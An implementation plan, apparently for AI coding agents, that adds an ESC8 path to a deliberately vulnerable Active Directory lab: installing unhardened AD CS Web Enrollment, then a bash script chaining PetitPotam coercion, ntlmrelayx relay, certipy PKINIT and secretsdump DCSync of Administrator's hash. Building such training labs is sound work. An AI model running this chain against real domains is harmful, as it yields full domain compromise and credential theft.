# Donerup AD-Hop ESC8 Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add ESC8 (coercion + NTLM relay to AD CS Web Enrollment) as a
fully independent, parallel route to Domain Admin on `DC01`, alongside the
existing ESC9/GenericWrite/Shadow-Credentials chain.

**Architecture:** Install the AD CS Web Enrollment (`certsrv`) IIS role on
the existing `Donerup-CA` (same DC, no new host). Coerce `DC01`'s machine
account to authenticate outbound (PetitPotam, authenticated as the
already-known `svc_ldap`), relay that NTLM authentication live to the Web
Enrollment HTTP endpoint (no EPA — the default, unhardened state), enroll a
certificate as `DC01$`, PKINIT with it, DCSync.

**Tech Stack:** PowerShell (`Install-AdcsWebEnrollment`) on the DC;
`certipy`, `ntlmrelayx.py` (Impacket), a PetitPotam coercion client, and
`secretsdump.py` from the Kali attacker box — all already present per the
`donerup_lab_environment_state` project memory except the coercion client,
which Task 2 confirms/installs.

**Spec:** `docs/superpowers/specs/2026-08-28-donerup-insane-depth-design.md`
(Approach B section)

## ⚠️ Blocked at time of writing — read before dispatching any task

Neither the Kali build/test VM nor the `DC01` VM is running (`vmrun list`
reported zero running VMs on 2026-08-28, and the Kali SSH host at the
address recorded in `donerup_lab_environment_state` timed out). **No task
in this plan can be implemented, let alone verified, without the live lab.**
Per the `ask_before_changing_vm_state` project memory, powering these VMs
on is a check-first action, not something to do unilaterally. Do not
dispatch Task 1 until the user has confirmed the lab is up and reachable
(fresh IPs recorded if they drifted on boot, per that same memory's
warning). Every task below is written to the same completeness standard as
the web-hop plan, but is entirely unverified against live infrastructure —
treat every PowerShell/bash block as a first draft to run and correct
empirically, not as proven-working code, and say so explicitly in each
task's report.

## Global Constraints

- No new hosts, VMs, or Docker services — same DC, same `Donerup-CA` (spec
  Non-goals).
- Must work against the current Server 2022 DC — no dependency on Server
  2025 features (spec Non-goals; the separate Server 2025 upgrade is
  independently blocked on the user sourcing licensed media).
- Reuses the already-known `svc_ldap` credential for the coercion
  authentication — do not introduce a new credential-discovery step (spec
  Approach B, flagged design trade-off the user already accepted).
- This path must end in DCSync via `DC01$`'s certificate — not via
  `GenericWrite`/Shadow Credentials/UPN-swap on `svc_backup` (that remains
  the separate, unmodified ESC9 path in `run-esc9-chain.sh`).
- Follow the existing script conventions exactly:
  `build/dc-provisioning/04-install-adcs-esc9.ps1` and
  `05-weaken-cert-binding.ps1` for PowerShell idempotency style;
  `build/exploit/run-esc10-check.sh` for the bash check-script style
  (`set -euo pipefail`, `DC_IP="${1:-10.10.20.10}"`, a required password
  positional arg via `${2:?usage: ...}`, `tee`'d output files under `/tmp`,
  a `PASS:`/`FAIL:` echo convention with `exit 1` on FAIL).
- Any firewall change is scoped as narrowly as the existing four
  `DONERUP_AD_PIVOT` rules in `build/network/setup-ad-pivot.sh` — never a
  blanket opening.

---

## Task 1: Install AD CS Web Enrollment on `DC01`

**Files:**
- Create: `build/dc-provisioning/07-install-web-enrollment.ps1`
- Create: `build/dc-provisioning/checks/check-web-enrollment.ps1`
  (confirmed 2026-08-28 against the live repo on Kali: the `checks/`
  directory uses descriptive names with **no numeric prefix** —
  `check-acl.ps1`, `check-cert-binding.ps1`, `check-domain.ps1`,
  `check-esc9.sh`, `check-root-flag.ps1`, `check-users.ps1` — and each
  script's entire body is just the assertion itself: `Write-Output "PASS:
  <what held>"` on success, or `Write-Output "FAIL: <what didn't, with the
  actual vs expected value>"` followed by `exit 1` on failure. No
  wrapper function, no red/green color codes. Match this exactly — do not
  invent a numbered filename or a heavier check-script structure.)

**Interfaces:**
- Consumes: `Donerup-CA` must already exist (`04-install-adcs-esc9.ps1`
  must have run first — this task does not re-verify that, it assumes the
  provisioning order documented in `donerup_lab_environment_state`).
- Produces: `https://dc01.donerup.htb/certsrv/` (or `http://`, whichever
  the default `Install-AdcsWebEnrollment` binds — confirm which during
  implementation and record it in the report; Task 2 needs the exact
  URL) reachable from the AD VLAN, with Extended Protection for
  Authentication left at its default (unconfigured) state.

- [ ] **Step 1: Write the script**

Create `build/dc-provisioning/07-install-web-enrollment.ps1`:

```powershell
# ESC8 condition (spec docs/superpowers/specs/2026-08-28-donerup-insane-depth-design.md,
# Approach B): AD CS Web Enrollment (the certsrv HTTP endpoint) with no
# Extended Protection for Authentication is the actual vulnerability -- it
# is the default state after this install, so unlike
# 05-weaken-cert-binding.ps1 there is no separate "weaken" step: doing
# nothing extra here IS the misconfiguration.
$ErrorActionPreference = "Stop"

$feature = Get-WindowsFeature -Name Adcs-Web-Enrollment
if ($feature.InstallState -eq "Installed") {
    Write-Output "Adcs-Web-Enrollment already installed, skipping Install-WindowsFeature"
} else {
    Install-WindowsFeature Adcs-Web-Enrollment -IncludeManagementTools | Out-Null
    Write-Output "installed Adcs-Web-Enrollment"
}

# Install-AdcsWebEnrollment throws if already configured against this CA;
# same check-then-act idempotency as Install-AdcsCertificationAuthority in
# 04-install-adcs-esc9.ps1.
$webEnrollmentConfigured = Test-Path "HKLM:\SOFTWARE\Microsoft\Cryptography\CertSvc\Configuration\Donerup-CA\Web Enrollment"
if ($webEnrollmentConfigured) {
    Write-Output "Web Enrollment already configured, skipping Install-AdcsWebEnrollment"
} else {
    Install-AdcsWebEnrollment -Force
    Write-Output "configured AD CS Web Enrollment for Donerup-CA"
}
```

- [ ] **Step 2: Deploy and run against the live DC**

Follow the exact `vmrun` deployment pattern already established for
`04`/`05`/`06` (see the "DC VM — drive it from the Windows host with
`vmrun`, not the console" section of the `donerup_lab_environment_state`
project memory, gotcha 4 in particular — `runProgramInGuest` does not
return stdout, so write the script to save its own output via
`Out-File`, copy it in, run it, copy the result back). Confirm the VMX
path and guest credentials from that same memory before running anything.

- [ ] **Step 3: Write the check script**

Create `build/dc-provisioning/checks/check-web-enrollment.ps1`, matching
`check-cert-binding.ps1`'s exact minimal style (no wrapper function, just
the assertion and a `PASS:`/`FAIL:` `Write-Output` + `exit 1` on failure):

```powershell
$feature = (Get-WindowsFeature -Name Adcs-Web-Enrollment).InstallState
if ($feature -ne "Installed") {
    Write-Output "FAIL: Adcs-Web-Enrollment InstallState is '$feature', expected 'Installed'"
    exit 1
}
try {
    $resp = Invoke-WebRequest -Uri "http://localhost/certsrv/" -UseBasicParsing -TimeoutSec 10
} catch {
    Write-Output "FAIL: GET http://localhost/certsrv/ threw: $_"
    exit 1
}
if ($resp.StatusCode -eq 200) {
    Write-Output "PASS: AD CS Web Enrollment is installed and certsrv answers 200"
} else {
    Write-Output "FAIL: GET http://localhost/certsrv/ returned $($resp.StatusCode), expected 200"
    exit 1
}
```

Correct the URL scheme/host in this draft if Step 2's actual run shows
Web Enrollment bound somewhere other than plain `http://localhost/certsrv/`.

- [ ] **Step 4: Run the check, record the actual bound URL**

Run the check script against the live DC. Record in the task report
exactly which scheme/hostname/path the enrollment endpoint answered on —
Task 2 needs this literal value for `ntlmrelayx.py -t`.

- [ ] **Step 5: Commit**

```bash
git add build/dc-provisioning/07-install-web-enrollment.ps1 \
  build/dc-provisioning/checks/07-check-web-enrollment.ps1
git commit -m "feat: install AD CS Web Enrollment role, the ESC8 precondition"
```

---

## Task 2: `run-esc8-check.sh` — coercion → relay → PKINIT → DCSync

**Files:**
- Create: `build/exploit/run-esc8-check.sh`

**Interfaces:**
- Consumes: the Web Enrollment URL Task 1 recorded; the `svc_ldap`
  password (same positional-arg convention as `run-esc9-chain.sh` /
  `run-esc10-check.sh`); `DC01`'s IP (`10.10.20.10` per existing scripts'
  default).
- Produces: a PASS/FAIL report on stdout, exit code `0`/`1`, matching
  `run-esc10-check.sh`'s convention exactly, so `full-chain-replay.sh`
  (Task 3) can call it the same way it calls the other check scripts.

- [ ] **Step 1: Install the coercion tool on Kali**

Confirmed 2026-08-28 against the live Kali VM: `ntlmrelayx.py`,
`secretsdump.py`, and `certipy` are already present at `/usr/local/bin/`,
but no PetitPotam-style coercion client is installed
(`which petitpotam.py PetitPotam.py` and a full `find /` both came up
empty). `git clone https://github.com/topotam/PetitPotam.git` **was
confirmed reachable and cloned successfully** from Kali this same session
— it contains `PetitPotam.py`. Install it for real use:

```bash
mkdir -p ~/tools && cd ~/tools
git clone --depth 1 https://github.com/topotam/PetitPotam.git
python3 ~/tools/PetitPotam/PetitPotam.py --help
```

Record the exact invocation path (`~/tools/PetitPotam/PetitPotam.py`) —
Step 2's script assumes it is on `PATH` as `PetitPotam.py`; either add
`~/tools/PetitPotam` to `PATH` or adjust Step 2's invocation to the full
path.

- [ ] **Step 2: Write the check script**

Create `build/exploit/run-esc8-check.sh`, following
`run-esc10-check.sh`'s structure:

```bash
#!/bin/bash
# ESC8 is a fully independent route to Domain Admin, alongside the
# existing ESC9/GenericWrite/Shadow-Credentials chain in
# run-esc9-chain.sh (spec docs/superpowers/specs/2026-08-28-donerup-insane-depth-design.md,
# Approach B). It reuses the already-known svc_ldap credential only to
# authenticate the coercion RPC call -- it does not touch svc_backup, the
# GenericWrite edge, or the DonerupUserAuth template's UPN mechanics at
# all. Do not run concurrently with run-esc9-chain.sh / run-esc10-check.sh:
# this script's relay listener binds a local port those don't use, but all
# three touch the same live DC and their outputs should not be interleaved.
set -euo pipefail
DC_IP="${1:-10.10.20.10}"
DOMAIN="donerup.htb"
SVC_LDAP_PASSWORD="${2:?usage: run-esc8-check.sh <dc-ip> <svc_ldap-password> <attacker-listener-ip>}"
LISTENER_IP="${3:?usage: run-esc8-check.sh <dc-ip> <svc_ldap-password> <attacker-listener-ip>}"

rm -f /tmp/esc8-relay.out /tmp/esc8-pkinit.out /tmp/esc8-dcsync.out
rm -f dc01\$.pfx dc01.ccache

echo "[1/4] Starting ntlmrelayx.py, targeting AD CS Web Enrollment"
# -t target is the Web Enrollment URL Task 1 recorded (default assumed
# here; correct this literal to whatever Task 1's report says the DC
# actually bound to).
ntlmrelayx.py -t "http://${DC_IP}/certsrv/certfnsh.asp" --adcs \
    > /tmp/esc8-relay.out 2>&1 &
RELAY_PID=$!
sleep 3

cleanup() {
    kill "$RELAY_PID" 2>/dev/null || true
}
trap cleanup EXIT

echo "[2/4] Coercing DC01\$ to authenticate to ${LISTENER_IP}"
python3 PetitPotam.py -u svc_ldap -p "$SVC_LDAP_PASSWORD" -d "$DOMAIN" \
    "$LISTENER_IP" "$DC_IP"

echo "[3/4] Waiting for the relay to complete and drop a certificate"
sleep 5
CERT_FILE=$(ls -t ./*.pfx 2>/dev/null | head -1 || true)
if [ -z "$CERT_FILE" ]; then
    echo "FAIL: no certificate was dropped by ntlmrelayx.py -- check /tmp/esc8-relay.out"
    cat /tmp/esc8-relay.out
    exit 1
fi

echo "[4/4] Authenticating with the relayed certificate (${CERT_FILE}) and DCSyncing"
certipy auth -pfx "$CERT_FILE" -dc-ip "$DC_IP" | tee /tmp/esc8-pkinit.out
DC_NT_HASH=$(grep -oP "Got hash for '[^']*': aad3b435b51404eeaad3b435b51404ee:\K[a-f0-9]{32}" /tmp/esc8-pkinit.out)

secretsdump.py -hashes "aad3b435b51404eeaad3b435b51404ee:${DC_NT_HASH}" \
    "${DOMAIN}/DC01\$@${DC_IP}" -just-dc-user Administrator | tee /tmp/esc8-dcsync.out

if grep -qP "Administrator:\d+:aad3b435b51404eeaad3b435b51404ee:[a-f0-9]{32}:::" /tmp/esc8-dcsync.out; then
    echo "PASS: ESC8 (coercion + NTLM relay to AD CS Web Enrollment) reached Administrator's NT hash via DC01\$ -- confirmed as an independent path alongside ESC9"
else
    echo "FAIL: DCSync via the relayed DC01\$ certificate did not recover Administrator's hash"
    exit 1
fi
```

This is a **first draft**, not proven working code — several specifics
depend on live behavior that cannot be checked right now: the exact
`ntlmrelayx.py` output format for the saved `.pfx` filename, whether
`certipy auth`'s hash-output regex matches what a machine-account PKINIT
actually prints (`run-esc10-check.sh`'s equivalent regex was written and
verified against real output for a *user* certificate — a machine
certificate's `certipy auth` output has not been observed by this project
before), and whether `DonerupUserAuth`'s SAN requirements even matter here
(per the spec's Risks section, the relay may need the CA's default machine
template, not `DonerupUserAuth`, since `--adcs` without `-c` lets
`ntlmrelayx` pick the CA's default template for the authenticating
account's type). Fix these against real output during Step 3, not by
further guessing.

- [ ] **Step 3: Run against the live lab and fix empirically**

Run the script against the live DC and Kali coercion/relay setup. Read the
actual `ntlmrelayx.py` and `certipy auth` output and correct the filename
glob and regex in Step 2's script to match reality — do not adjust the
script to make a still-wrong assumption "look like it would work"; run it
again after each correction until PASS.

- [ ] **Step 4: Empirically verify the coercion callback survives the firewall**

Before Step 3's first run, or if Step 3 hangs at `[2/4]` with no callback
ever reaching the relay listener, check whether
`build/network/setup-ad-pivot.sh`'s `DONERUP_AD_PIVOT` chain is dropping
the DC-initiated connection (spec's flagged Risk — rule 3 there only
accepts `AD_VLAN_SUBNET → INTERNAL_AD_SUBNET` traffic that is
`ESTABLISHED,RELATED`, not new connections DC-initiates). Check with:

```bash
iptables -L DONERUP_AD_PIVOT -v -n | grep -A2 "AD_VLAN_SUBNET"
```

**If the callback is confirmed blocked** (the coercion attempt times out
and the rule-3-equivalent counter increments on a test packet), the
narrowest fix is adding one rule to `build/network/setup-ad-pivot.sh`,
immediately after the existing rule 2 (`# 2. Only the internal-ad
bridge...`):

```bash
# 2b. Allow DC-initiated NEW connections back to the internal-ad bridge --
# needed for the ESC8 coercion callback to reach a relay listener running
# inside the web container (spec docs/superpowers/specs/2026-08-28-donerup-insane-depth-design.md,
# Approach B risk note). Scoped to the AD VLAN <-> internal-ad pair only,
# the same boundary every other rule in this chain enforces; it does not
# open anything toward the VPN client subnet (rule 1 still drops that).
iptables -A DONERUP_AD_PIVOT -s "$AD_VLAN_SUBNET" -d "$INTERNAL_AD_SUBNET" -j ACCEPT
```

Note this makes the existing rule 3
(`-s "$AD_VLAN_SUBNET" -d "$INTERNAL_AD_SUBNET" -m state --state ESTABLISHED,RELATED -j ACCEPT`)
redundant (a strict subset of the new rule) — leave rule 3 in place rather
than deleting it; removing working, previously-verified rules as a side
effect of this task is out of scope, and the redundancy is harmless.

Only make this firewall change if Step 4's empirical test actually shows
the callback is blocked — do not add it speculatively.

- [ ] **Step 5: Commit**

```bash
git add build/exploit/run-esc8-check.sh
# If Step 4 required the firewall change:
git add build/network/setup-ad-pivot.sh
git commit -m "feat: add ESC8 coercion+relay verification, independent of the ESC9 chain"
```

---

## Task 3: Wire ESC8 into the full chain replay

**Files:**
- Modify: `build/exploit/full-chain-replay.sh`

**Interfaces:**
- Consumes: `run-esc8-check.sh` (Task 2), invoked the same way the script
  already invokes `run-esc10-check.sh` — find that exact call site first
  (grep the file for `run-esc10-check.sh`) and match its argument-passing
  and PASS/FAIL-reporting pattern precisely, rather than inventing a new
  convention.

- [ ] **Step 1: Read the existing ESC10 wiring**

```bash
grep -n "run-esc10-check.sh" build/exploit/full-chain-replay.sh
```

Read the surrounding 10-15 lines to see exactly how that phase is
introduced (its `echo "== Phase N: ... =="` header), how it's invoked, and
how its exit code is checked (`check "..." $?` per the pattern used
throughout this file).

- [ ] **Step 2: Add the equivalent ESC8 phase**

Add a new phase immediately after the ESC10 phase, following its exact
structure: an `echo "== Phase N: ESC8 (coercion + NTLM relay to AD CS Web
Enrollment) — independent path to Domain Admin =="` header, the
`run-esc8-check.sh "$DC_IP" "$SVC_LDAP_PASSWORD" "<listener-ip>"`
invocation (match how `$DC_IP` and `$SVC_LDAP_PASSWORD` are already
threaded through the rest of the file — grep for both to find the exact
variable names in scope at that point), and a `check "ESC8 independent
path reaches Administrator via DC01\$" $?` line. This phase must be
reported independently — it must not be gated behind, or gate, the
ESC9/ESC10 phases.

- [ ] **Step 3: Run the full replay against the live lab**

```bash
sudo -E env "PATH=$PATH" ./full-chain-replay.sh localhost 10.10.20.10 <svc_ldap-password>
```

(matching the exact invocation convention recorded in
`donerup_lab_environment_state` — plain `sudo` loses `certipy`, so `-E env
"PATH=$PATH"` is required). Confirm `ALL PHASES PASSED` including the new
ESC8 phase.

- [ ] **Step 4: Commit**

```bash
git add build/exploit/full-chain-replay.sh
git commit -m "test: wire the ESC8 check into the full chain replay as an independent phase"
```

---

## Out of scope for this plan

- The web-hop SSRF work (spec Approach A) — separate plan,
  `docs/superpowers/plans/2026-08-28-donerup-web-hop-ssrf.md`, no file
  overlap with this one.
- Updating `docs/donerup-writeup.md` — happens once both plans are built
  and verified.
- The Windows Server 2025 upgrade — independently blocked on the user
  sourcing licensed media; this plan is explicitly Server-2022-compatible
  and must stay that way.
